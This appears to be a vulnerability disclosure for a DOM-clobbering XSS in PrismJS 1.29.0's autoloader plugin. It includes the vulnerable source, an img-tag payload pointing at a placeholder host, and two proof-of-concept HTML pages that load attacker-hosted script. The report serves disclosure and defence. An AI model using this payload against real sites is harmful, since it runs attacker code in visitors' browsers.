## Prism

### Meta

+ Library: Prism
+ Stars: 12.2K
+ Version: v1.29.0
+ Fingerprint: `typeof window.Prism !== 'undefined'`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>```
+ Impact: XSS
+ CVE: N/A
+ Status: Reported
+ Foundby: TheHulk

### Library

URL:
+ `https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.js`
+ `https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js`

https://github.com/PrismJS/prism

### Vulnerable Code Snippet

```js
currentScript: function () {
				if (typeof document === 'undefined') {
					return null;
				}
				if ('currentScript' in document && 1 < 2 /* hack to trip TS' flow analysis */) {
					return /** @type {any} */ (document.currentScript);
				}
                ...
			},
```

```js
var script = Prism.util.currentScript();
if (script) {
    var autoloaderFile = /\bplugins\/autoloader\/prism-autoloader\.(?:min\.)?js(?:\?[^\r\n/]*)?$/i;
    var prismFile = /(^|\/)[\w-]+\.(?:min\.)?js(?:\?[^\r\n/]*)?$/i;

    var autoloaderPath = script.getAttribute('data-autoloader-path');
    if (autoloaderPath != null) {
        // data-autoloader-path is set, so just use it
        languages_path = autoloaderPath.trim().replace(/\/?$/, '/');
    } else {
        var src = script.src;
        if (autoloaderFile.test(src)) {
            // the script is the original autoloader script in the usual Prism project structure
            languages_path = src.replace(autoloaderFile, 'components/');
        }
    }
}
```

## PoC

host malicious file at `/components/prism-css.min.js`

```html
<!--Library-->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.css" integrity="sha512-jtWR3pdYjGwfw9df601YF6uGrKdhXV37c+/6VNzNctmrXoO0nkgHcS03BFxfkWycOa2P2Nw9Y9PCT9vjG9jkVg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.js" integrity="sha512-jhk8ktzYxeUWJ/vx3Lzp53xE0Jgsp+UxA3wDyRSYeMBdPutgCp6jiGvTjyZm+R7cn3Lu/0MnEIR421EOdl3qAg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.js"></script>

<pre><code class="language-css">p { color: red }</code></pre>
<!--Library-->

<!--Payload-->
<img name=currentScript src="http://localhost:9999/a.js"></img>
<!--Payload-->
```

```html
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.css" integrity="sha512-jtWR3pdYjGwfw9df601YF6uGrKdhXV37c+/6VNzNctmrXoO0nkgHcS03BFxfkWycOa2P2Nw9Y9PCT9vjG9jkVg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>

<img name=currentScript src="http://localhost:8000/a.js"></img>

<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.js" integrity="sha512-jhk8ktzYxeUWJ/vx3Lzp53xE0Jgsp+UxA3wDyRSYeMBdPutgCp6jiGvTjyZm+R7cn3Lu/0MnEIR421EOdl3qAg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.js"></script>

<pre><code class="language-css">p { color: red }</code></pre>

</body>
</html>
```
